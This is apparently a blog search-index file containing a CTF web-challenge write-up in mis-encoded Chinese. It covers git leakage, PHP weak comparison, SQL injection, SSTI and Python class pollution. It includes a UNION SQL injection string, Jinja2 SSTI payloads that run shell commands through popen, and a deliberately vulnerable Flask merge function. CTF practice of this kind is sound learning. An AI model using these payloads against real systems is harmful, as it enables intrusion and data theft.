<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf</title>
      <link href="/posts/15956.html"/>
      <url>/posts/15956.html</url>
      
        <content type="html"><![CDATA[<h1 id="ctfâ€“web"><a href="#ctfâ€“web" class="headerlink" title="?ctfâ€“web"></a>?ctfâ€“web</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¤ç°ä¸€ä¸‹æœ€è¿‘çš„æ–°æ‰‹èµ›ï¼Œå¤ç°å®Œå°±å»ååºåˆ—åŒ–å’Œjavaäº†ï¼Œsunå¸ˆå‚…æ‹·æ‰“çš„å‹è¿«æ„Ÿ</span><br><span class="line">?ctfçš„ä½“é‡å’Œè€ƒç‚¹éƒ½å¾ˆé€‚å®œå¥½ç©ï¼Œå¼€èµ›çš„æ—¶å€™åªæ‰“äº†week1çš„ï¼Œæœç„¶è¿˜æ˜¯ç­‰ä¸åŠï¼Œåé¢å°±æ²¡æ‰“å®Œèµ›æ‰“å®Œå¥½äº†ã€ä¾æ—§æ˜¯æ²¡æœ‰æ‰“week4çš„é‚£ä¿©ä½“ååºåˆ—åŒ–ï¼Œä¸‹æ¬¡ä¸€å®šå˜»å˜»ã€‘</span><br><span class="line">æœ‰çš„ç‚¹æ²¡æ€è·¯äº†å°±çœ‹äº†å®˜pï¼Œc3å“¥å“¥å¤§çˆ±æ¨¡æ¿ï¼Œå–œæ¬¢ã€å¾®ä¿¡å…¬ä¼—å·ç›´æ¥æœA1nataså°±å¥½äº†ã€‘</span><br><span class="line">ä¸å¯¹çš„é­”ä¸¸å‘è¨€çš„åœ°æ–¹ï¼Œéšæ—¶è”ç³»äº¤æµç‹ ç‹ æ‹·æ‰“æˆ‘ æ„Ÿè°¢å¸ˆå‚…</span><br></pre></td></tr></table></figure><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="from-http"><a href="#from-http" class="headerlink" title="from_http"></a><strong>from_http</strong></h3><h4 id="è€ƒç‚¹ï¼šhttpåè®®"><a href="#è€ƒç‚¹ï¼šhttpåè®®" class="headerlink" title="è€ƒç‚¹ï¼šhttpåè®®"></a>è€ƒç‚¹ï¼šhttpåè®®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»httpå…¥é—¨å§~</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103142439101.png" alt="image-20251103142439101"></p><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping??"></a><strong>Ping??</strong></h3><h4 id="è€ƒç‚¹ï¼šlinuxå‘½ä»¤"><a href="#è€ƒç‚¹ï¼šlinuxå‘½ä»¤" class="headerlink" title="è€ƒç‚¹ï¼šlinuxå‘½ä»¤"></a>è€ƒç‚¹ï¼šlinuxå‘½ä»¤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªpingå·¥å…·ï¼Œç„¶åç‹ ç‹ çš„æƒ³åŠæ³•pingæˆ‘å§</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103142651244.png" alt="image-20251103142651244"></p><p>å¯¹flagè¿›è¡Œäº†è¿‡æ»¤ï¼ŒæŸ¥çœ‹index.phpå‘ç°æ˜¯å¯¹å®Œæ•´çš„flagè¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆè¿›è¡Œé€šé…ç¬¦åŒ¹é…å°±å¥½äº†</p><p><img src="/../images/image-20251103142907720.png" alt="image-20251103142907720"><img src="/../images/image-20251103143046336.png" alt="image-20251103143046336"></p><h3 id="Gitttttttt"><a href="#Gitttttttt" class="headerlink" title="Gitttttttt"></a><strong>Gitttttttt</strong></h3><h4 id="è€ƒç‚¹ï¼š-gitä¿¡æ¯æ³„éœ²"><a href="#è€ƒç‚¹ï¼š-gitä¿¡æ¯æ³„éœ²" class="headerlink" title="è€ƒç‚¹ï¼š.gitä¿¡æ¯æ³„éœ²"></a>è€ƒç‚¹ï¼š.gitä¿¡æ¯æ³„éœ²</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»Šå¤©å¸ƒç½®ç½‘ç«™çš„æ—¶å€™å‘ç°æœ¬åœ°æ€ä¹ˆæœ‰ä¸ª.gitæ–‡ä»¶å¤¹ï¼Œé‚£æ˜¯ä»€ä¹ˆï¼Ÿæ— æ‰€è°“äº†ï¼Œæˆ‘çš„é™æ€ç½‘é¡µä¸å¯èƒ½å­˜åœ¨æ¼æ´ï¼</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨gackbyè·å–.gitæ–‡ä»¶å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://challenge.ilovectf.cn:30589/.git/</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103143455238.png" alt="image-20251103143455238"></p><p><img src="/../images/image-20251103143522322.png" alt="image-20251103143522322"></p><h3 id="åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼"><a href="#åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼" class="headerlink" title="åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼"></a><strong>åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼</strong></h3><h4 id="è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š"><a href="#è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š" class="headerlink" title="è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š"></a>è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°†ç‰©å“æŠ•å…¥é”…é‡Œå³å¯æ”¶è·ç¥ç§˜ç¤¼å“ğŸ˜‹</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103144203470.png" alt="image-20251103144203470"></p><p>è¯•äº†è¯•æ˜¯å››å±‚ç›®å½•ç»“æ„</p><p><img src="/../images/image-20251103144239645.png" alt="image-20251103144239645"></p><h3 id="secret-of-php"><a href="#secret-of-php" class="headerlink" title="secret of php"></a><strong>secret of php</strong></h3><h4 id="è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ"><a href="#è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ" class="headerlink" title="è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ"></a>è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ</h4><p><img src="/../images/image-20251103150121318.png" alt="image-20251103150121318"></p><p>intvalå‡½æ•°åå¼ºç­‰äºï¼Œä½¿ç”¨å°æ•°ç‚¹ç»•è¿‡?a&#x3D;2025.1</p><p><img src="/../images/image-20251103150218496.png" alt="image-20251103150218496"></p><p>æ¥åˆ°fll4g.phpæ˜¯ç»å…¸çš„md5äº†</p><p><img src="/../images/image-20251103150316954.png" alt="image-20251103150316954"></p><p>ç¬¬ä¸€å±‚æ˜¯ç‰¹æ®Šçš„å­—ç¬¦ä¸²ç»•è¿‡</p><p>ç¬¬äºŒå±‚æ˜¯æ•°ç»„ç»•è¿‡</p><p>ç¬¬ä¸‰å±‚æ˜¯md5ç¢°æ’</p><p><img src="/../images/image-20251103150939241.png" alt="image-20251103150939241"></p><h3 id="å‰ç«¯å°æ¸¸æˆ"><a href="#å‰ç«¯å°æ¸¸æˆ" class="headerlink" title="å‰ç«¯å°æ¸¸æˆ"></a><strong>å‰ç«¯å°æ¸¸æˆ</strong></h3><h4 id="è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡"><a href="#è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡" class="headerlink" title="è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡"></a>è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡</h4><p><img src="/../images/image-20251103151239293.png" alt="image-20251103151239293"></p><p>base64è§£ç å³å¯</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ç™»å½•å’ŒæŸ¥è¯¢"><a href="#ç™»å½•å’ŒæŸ¥è¯¢" class="headerlink" title="ç™»å½•å’ŒæŸ¥è¯¢"></a><strong>ç™»å½•å’ŒæŸ¥è¯¢</strong></h3><h4 id="è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´-sqlæ³¨å…¥"><a href="#è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´-sqlæ³¨å…¥" class="headerlink" title="è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´+sqlæ³¨å…¥"></a>è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´+sqlæ³¨å…¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¹ˆç®€å•çš„ç™»å½•å’ŒæŸ¥è¯¢ç•Œé¢ï¼Œåº”è¯¥æ˜¯æ¼æ´ç™¾å‡ºçš„å§ï½</span><br><span class="line"></span><br><span class="line">æç¤ºï¼šæœ¬é¢˜åªéœ€è¦å°‘äº100æ¬¡çš„çˆ†ç ´ï¼Œå¿«é€Ÿå¤§é‡çˆ†ç ´å¯èƒ½å¯¼è‡´æ„å¤–è¢«å¹³å°æ‹¦æˆªæµé‡ï¼ˆä¸æ˜¯é¢˜ç›®é—®é¢˜ï¼‰ã€‚</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103151647865.png" alt="image-20251103151647865"></p><p>ç»™äº†è´¦å·åå·²ç»å¯†ç å­—å…¸</p><p><img src="/../images/image-20251103151749681.png" alt="image-20251103151749681"></p><p>å¸¸è§„çˆ†ç ´å¯†ç ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ˜¯302é‡å®šå‘äº†</p><p><img src="/../images/image-20251103152137919.png" alt="image-20251103152137919"></p><p>ç™»å½•å¯†ç è¿›æ¥ä¹‹åæ˜¯ä¸€ä¸ªSQLæ³¨å…¥ï¼Œflagåœ¨flagsè¡¨é‡Œ</p><p><img src="/../images/image-20251103152329633.png" alt="image-20251103152329633"></p><p>sqlè”åˆæ³¨å…¥ï¼Œå‘idä¼ å…¥çš„å‚æ•°å€¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT flag, NULL, NULL FROM flags WHERE id=2--%20</span><br></pre></td></tr></table></figure><h3 id="Only-Picture-Up"><a href="#Only-Picture-Up" class="headerlink" title="Only Picture Up"></a><strong>Only Picture Up</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å’¦ï¼Ÿä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡å°±èƒ½å¾—åˆ°flagï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ "><a href="#è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ "></a>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ </h4><p>ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ç„¶åç›´æ¥è¿æ¥æœ¨é©¬å°±å¥½äº†</p><p>flagåœ¨æ ¹ç›®å½•ä¸‹</p><p><img src="/../images/image-20251103162640937.png" alt="image-20251103162640937"></p><h3 id="Regular-Expression"><a href="#Regular-Expression" class="headerlink" title="Regular Expression"></a>Regular Expression</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ä¸ªå¥½å·¥å…·ï¼</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251103163025491.png" alt="image-20251103163025491"></p><h4 id="è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼"><a href="#è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼"></a>è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼</h4><p>ç¬¬ä¸€å…³çš„æ­£åˆ™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/^-(ctf|CTF)&lt;\n&gt;&#123;5&#125;[h-l]\d\d\W+@email\.com flag.\b$/&#x27;, $_ï¼Ÿ) &amp;&amp; strlen($_ï¼Ÿ) == 40)</span><br></pre></td></tr></table></figure><p>ä¼ å‚å˜é‡åæ˜¯?,ç„¶è€Œ?åœ¨urlä¸­â¼œæ˜¯èµ„æºè·¯å¾„å’Œå‚æ•°çš„åˆ†éš”ç¬¦,å¯ä»¥ä½¿ç”¨ç¼–ç æˆ–è€…å†™pythonè„šæœ¬æ¥è¯´æ˜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1ã€^-</span><br><span class="line">è¿™æ˜¯å¿…é¡»ä»¥ - å·ä¸ºå­—ç¬¦ä¸²å¼€å¤´ï¼Œæ‰€ä»¥æˆ‘ä»¬å­—ç¬¦ä¸²çš„å¼€å¤´å¿…é¡»æ˜¯å‡å·ã€‚</span><br><span class="line">2ã€(ctf|CTF)</span><br><span class="line">è¿™ä¿©æ˜¯â¼€ä¸ªåŒ¹é…ç»„ï¼Œå°±æ˜¯å‡å·åâ¾¯ç´§è·Ÿç€å¾—æ˜¯ ctf æˆ–è€… CTF ï¼Œâ¼†è€…é€‰å…¶â¼€ã€‚</span><br><span class="line">3ã€&lt;\n&gt;&#123;5&#125;</span><br><span class="line">ä¸»è¦æ˜¯&gt;&#123;5&#125;ï¼Œè¿™ä¸ªçš„æ„æ€æ˜¯è¦æœ‰äº”ä¸ª&gt;ï¼Œ&lt;ä¸å˜ï¼Œ\næ˜¯æ¢â¾ï¼Œurlç¼–ç â¼€ä¸‹å°±æ˜¯%0aï¼Œæ‰€ä»¥è¿™â¾¥æ˜¯ &lt;%0a&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">4ã€[h-l]</span><br><span class="line">è¿™æ˜¯é€šé…ç¬¦ï¼Œåœ¨håˆ°lä¹‹å‰çš„å­—âºŸé€‰å…¶â¼€å¡«â¼Šï¼Œè¿™â¾¥å¯ä»¥æ˜¯hã€iã€jã€kã€lã€‚äº”é€‰â¼€å¡«â¼Š</span><br><span class="line">5ã€\d\d</span><br><span class="line">\dåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ˜¯ä»»æ„æ•°å­—ï¼Œä¸¤ä¸ªå°±æ˜¯ä»»æ„â¼€ä¸ªä¸¤ä½æ•°ï¼Œâ½å¦‚ 55</span><br><span class="line">6ã€\W+</span><br><span class="line">è¿™â¾¥æ˜¯ä¸é™¤ A-Zã€a-zã€0-9 å’Œä¸‹åˆ’çº¿ä»¥å¤–çš„ä»»æ„å­—ç¬¦åŒ¹é…ï¼Œâ½å¦‚!ã€@ã€~ã€#ã€ç©ºæ ¼ã€ç­‰ç­‰ã€‚åŠ å·çš„æ„æ€æ˜¯è´ªå©ªåŒ¹é…ï¼Œâ¼€</span><br><span class="line">æ¬¡æˆ–å¤šæ¬¡åŒ¹é…å‰â¾¯çš„å­—ç¬¦æˆ–â¼¦è¡¨è¾¾å¼ã€‚è¿™â¾¥å°±æ˜¯æˆ‘ä»¬æ»¡â¾œåâ¾¯å­—ç¬¦ä¸²â»“åº¦ä¸º40æ‰€éœ€è¦æ§åˆ¶çš„åœ°â½…ï¼Œå› ä¸ºè¿™â¾¥å¯ä»¥æ˜¯ä»»æ„â»“</span><br><span class="line">åº¦ã€‚</span><br><span class="line">7ã€@email.com flag.</span><br><span class="line">å­—â¾¯æ„æ€ã€‚ç¬¬â¼€ä¸ªç‚¹å·è¢«åæ–œæ è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å°±æ˜¯ç‚¹å·ï¼Œç¬¬â¼†ä¸ªç‚¹å·åœ¨æ­£åˆ™è¡¨è¾¾å¼å½“ä¸­çš„ä½œâ½¤å°±æ˜¯åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦â½å¦‚</span><br><span class="line">aï¼Œæ‰€ä»¥è¿™â¾¥æ˜¯ @email.com`` flaga</span><br><span class="line">8ã€.\b$</span><br><span class="line">è¿™â¾¥æ˜¯ä»¥ä»»æ„å­—ç¬¦ç»“å°¾ï¼Œéšä¾¿ä»€ä¹ˆå­—âºŸæ•°å­—éƒ½å¯ä»¥ã€‚</span><br><span class="line"></span><br><span class="line">&quot;-ctf&lt;&quot; + &quot;\n&quot; + &quot;&gt;&gt;&gt;&gt;&gt;&quot; + &quot;h12&quot; + &quot;!@#$%^&amp;*()&quot; + &quot;@email.com flaga&quot;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³æ­£åˆ™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test_string = &#x27;Please\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0&#x27;;</span><br><span class="line"></span><br><span class="line">(preg_match(&#x27;/&#x27;.$preg.&#x27;/&#x27;, $test_string) &amp;&amp; strlen($_POST[&#x27;preg&#x27;]) &gt; 77)</span><br></pre></td></tr></table></figure><p>åæ–œæ å’Œé—®å·å±äºæ­£åˆ™è¡¨è¾¾å¼ä¿ç•™å­—ç¬¦ï¼Œè¦åŒ¹é…ä»–ä»¬æœ¬èº«éœ€è¦è¢«è½¬ä¹‰ã€‚åŠ å·åœ¨æµè§ˆå™¨ä¼ å‚çš„æ—¶å€™ä¸èƒ½ç›´æ¥å†™ï¼Œç›´æ¥å†™ä¼šè¢«å½“æˆç©ºæ ¼ä¼ åˆ°åç«¯ï¼ŒåŠ å·éœ€è¦urlç¼–ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> r&quot;\QPlease\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0\E(?#&quot; + &quot;A&quot;*80 + &quot;)&quot;</span><br><span class="line"> </span><br><span class="line"> preg=Please\\ 777give\%2b. !me\?!(-!)</span><br><span class="line">(.*)Flagg[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH]</span><br><span class="line">[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH]</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/2403_88857807/article/details/154292256">?CTF 2025 misc webéƒ¨åˆ†è§£-CSDNåšå®¢</a>çš„è„šæœ¬ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸å‘é€è¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">url = &quot;http://challenge.ilovectf.cn:30399/&quot;</span><br><span class="line"> </span><br><span class="line">get_val = &quot;-ctf&lt;&quot; + &quot;\n&quot; + &quot;&gt;&gt;&gt;&gt;&gt;&quot; + &quot;h12&quot; + &quot;!@#$%^&amp;*()&quot; + &quot;@email.com flaga&quot;</span><br><span class="line">preg = r&quot;\QPlease\ 777give+. !me?&lt;=-=&gt;(.*)Flaggg0\E(?#&quot; + &quot;A&quot;*80 + &quot;)&quot;</span><br><span class="line"> </span><br><span class="line">r = requests.post(url, params=&#123;&quot;?&quot;: get_val&#125;, data=&#123;&quot;preg&quot;: preg&#125;, timeout=10)</span><br><span class="line">print(&quot;HTTP&quot;, r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="ç•™è¨€æ¿"><a href="#ç•™è¨€æ¿" class="headerlink" title="ç•™è¨€æ¿"></a>ç•™è¨€æ¿</h3><h4 id="è€ƒç‚¹ï¼šSSTIæ¼æ´"><a href="#è€ƒç‚¹ï¼šSSTIæ¼æ´" class="headerlink" title="è€ƒç‚¹ï¼šSSTIæ¼æ´"></a>è€ƒç‚¹ï¼šSSTIæ¼æ´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_61955196/article/details/132237648</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jinjia2ç‰Œç•™è¨€æ¿ï¼Œæ¥è¯´ç‚¹ä»€ä¹ˆå§~</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•</strong>æ¼æ´å­˜åœ¨æƒ…å†µ</p><p><img src="/../images/image-20251109231754885.png" alt="image-20251109231754885"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110164203821.png" alt="image-20251110164203821"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[156].__init__.__globals__.popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110164344001.png" alt="image-20251110164344001"></p><p>ä½¿ç”¨requestç»•è¿‡å•å¼•å·å’ŒåŒå¼•å·ï¼ŒæŸ¥çœ‹æºç æ‰¾ä¼ å‚ï¼Œè®¿é—®äº†&#x2F;sstiè·¯ç”±ï¼Œâ½¤POSTâ½…æ³•ä¼ å‚messgeã€‚</p><p><img src="/../images/image-20251110164622245.png" alt="image-20251110164622245"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[156].__init__.__globals__.popen(request.form.a).read()&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110164958883.png" alt="image-20251110164958883"></p><h3 id="è¿™æ˜¯ä»€ä¹ˆå‡½æ•°"><a href="#è¿™æ˜¯ä»€ä¹ˆå‡½æ•°" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆå‡½æ•°"></a>è¿™æ˜¯ä»€ä¹ˆå‡½æ•°</h3><h4 id="è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“"><a href="#è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“" class="headerlink" title="è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“"></a>è€ƒç‚¹ï¼špythonåŸå‹é“¾æ±¡æŸ“</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ²¡è§è¿‡ï¼Ÿæœä¸€ä¸‹ï¼åœ¨/flag</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110165413127.png" alt="image-20251110165413127"></p><p>æç¤ºä¿¡æ¯æ”¶é›†ï¼Œé‚£ä¹ˆç›®å½•æ‰«æä¸€ä¸‹</p><p><img src="/../images/image-20251110171757499.png" alt="image-20251110171757499"></p><p>&#x2F;flagå’Œ&#x2F;srcè·¯ç”±ï¼Œåœ¨&#x2F;srcå½“ä¸­æºç æ³„éœ²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">cat = &quot;where is the flag?&quot;</span><br><span class="line">dog = &quot;how to get the flag?&quot;</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def flag():</span><br><span class="line">    with open(&#x27;/flag&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">        flag = f.read().strip()</span><br><span class="line">    if cat == dog:</span><br><span class="line">        return flag </span><br><span class="line">    else:</span><br><span class="line">        return cat + &quot; &quot; + dog</span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Pollution():</span><br><span class="line">    if request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    return &quot;success&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110170414105.png" alt="image-20251110170414105"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flagï¼šåˆ¤æ–­å…¨å±€å˜é‡catå’Œdogæ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™è¾“å‡ºflagï¼Œå¦åˆ™è¾“å‡ºcatå’Œdogå˜é‡å€¼ã€‚</span><br><span class="line">/srcï¼šæ˜¾ç¤ºå½“å‰â½‚ä»¶ï¼Œå³fileã€‚</span><br><span 